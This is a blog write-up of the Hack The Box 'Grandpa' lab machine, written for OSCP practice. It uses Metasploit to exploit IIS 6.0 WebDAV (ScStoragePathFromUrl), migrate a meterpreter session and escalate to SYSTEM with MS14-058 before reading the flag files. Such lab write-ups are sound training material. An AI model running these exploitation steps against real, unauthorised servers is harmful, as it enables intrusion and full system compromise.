---
title: "Hack The Box - Grandpa"
date: 2020-01-30
tags: [oscp, htb, windows, metasploit]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Exploiting IIS WebDAV and MS14-058 (with MSF)"
picture: /assets/htb-grandpa/machine_info.png
author_profile: false
---

![](/assets/htb-grandpa/machine_info.png)

> NOTE: This write-up is part of a set, with the other being [Granny](https://dm7500.github.io/oscp-prep/2020-01-31-HTB-Granny/). Since the boxes are so similar, but the easy way to root is via Metasploit, I decided to do one with MSF, and one without. Grandpa will be done with Metaspliot, and Granny done without Metasploit, in order to better practice for the OSCP.

## Enumeration

Our initial Nmap scans show only port 80, running Microsoft IIS 6.0, which means this is a Windows Server 2003 machine. We can also see from the `http-webdav-scan` section of the below report, that WebDAV is enabled, and various methods are allowed.

```
Nmap scan report for 10.10.10.14
Host is up, received user-set (0.059s latency).
Scanned at 2020-01-30 17:13:15 EST for 18s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Thu, 30 Jan 2020 22:14:08 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

## Initial Shell

### IIS Remote exploit

Let's see what IIS exploits MSF has for us. Launch Metasploit with `msfconsole`, then type `search iis` to get a list of matching exploits.

<a href="/assets/htb-grandpa/msf_search_iis.png"><img src="/assets/htb-grandpa/msf_search_iis.png" width="95%"></a>

The `exploit/windows/iis/iis_webdav_upload_asp` options looks good, as it's rated Excellent. So we can type `use exploit/windows/iis/iis_webdav_upload_asp` to load it. The `options` command shows the options for the module. 

![](/assets/htb-grandpa/msf_webdavasp_options.png)

You can see that the `RHOSTS` field is empty, so we need to set the IP of our target with `set 10.10.10.14`. Once this is set, simply type `run` to launch the exploit.

![](/assets/htb-grandpa/msf_webdavasp_run_failed.png)

### IIS Remote exploit (part duex!)

So it looks like this one failed, as it can't upload the text file it needs to exploit WebDAV. Let's try the other option of `exploit/windows/iis/iis_webdav_scstoragepathfromurl`, by typing `use exploit/windows/iis/iis_webdav_scstoragepathfromurl`.

![](/assets/htb-grandpa/msf_webdav_options.png)

Again, we can see that we need to set the `RHOSTS` variable with `set rhosts 10.10.10.14` before typing `run`. This time, we got back a meterpreter session.

![](/assets/htb-grandpa/msf_webdav_run_good.png)

---

## Privilege Escalation

### Migrate process

Now that we have a shell, let's see where we are. The `getuid` meterpreter command should give us back the user we're running as. However, it tells us that access is denied.

![](/assets/htb-grandpa/msf_getuid_failed.png)

Let's open a full shell with the `shell` command to see what's going on. As we can see with a `whoami` command, we're running as `NETWORK SERVICE`. SO the likely cause is that since we're not a real user on the mahcine, we're limited to what we can do.

![](/assets/htb-grandpa/msf_shell.png)

>NOTE: You can exit the shell with the `exit` command.

While the `NETWORK SERVICE` account is limited right now, we can possibly migrate our session to a process that is running as `NETWORK SERVICE`, which will allow us to run what we need. Meterpreter makes migration like this simple. All we need to do is hit `ps` to list the running serivces on the target, and find one running as the account we need. Notice that the `wmiprvse.exe` service is running as `NETWORK SERVICE` as well, so this is a good target for our migration.

![](/assets/htb-grandpa/msf_ps.png)

To migrate to the new process, ass we need to do is type `migrate 1856`, where `1856` is the PID of the target service. As you can see, this now allows us to properly interact with the system.

![](/assets/htb-grandpa/msf_migration.png)

### Local Exploit Suggester

Now that we can properly use our meterpreter session, we can see what we need to be able to gain administrative access. Metasploit has a handy module called `post/multi/recon/local_exploit_suggester`, which will use our existing session to suggest other MSF modules that we can use for privilege escalation. We can type `bg` to background the current meterpreter session, then type `search local_exploit` to find the module. Once we've found it, `use post/multi/recon/local_exploit_suggester` will load it, and `options` will show us the options for it. Note that the only real option variable is `SESSION`, where we need to point it to an existing meterpreter session.

![](/assets/htb-grandpa/msf_search_local_ex.png)

We can set the sesison with `set session 2`, and type `run` to run the module. YOu'll see it connect to our existing session, and list out possible exploit modules for us to try.

![](/assets/htb-grandpa/msf_exploit_suggestions.png)

### MS14-058

Now we need to pick an exploit from the list. I'm going with `exploit/windows/local/ms14_058_track_popup_menu`, as it tells me that the target appears vulnerable. Type `use exploit/windows/local/ms14_058_track_popup_menu` to load the module, and `options` to show the options. As before, we need to point it to our existing session with `set session 2`.

![](/assets/htb-grandpa/load_privesc.png)

On this specific exploit, there is another variable called `LHOST`, which is the IP of the machine that will run the listener. We can set this with `set lhost tun0`, to point it to the IP of our `tun0` interface, which is the HTB VPN. NOw we can simply type `run` to launch the exploit.

![](/assets/htb-grandpa/system_exploit.png)

As you can see, we got back another session as `SYSTEM`. Now all that's left is to grab `user.txt` and `root.txt` from the target.

### Loot

>NOTE: Use the meterpreter `shell` command to grab the files from a regular shell.

You can read `user.txt` from `C:\Documents and Settings\Harry\Desktop\user.txt`.

![](/assets/htb-grandpa/user_proof.png)

You can read `root.txt` from `C:\Documents and Settings\Administrator\Desktop\root.txt`

![](/assets/htb-grandpa/root_proof.png)

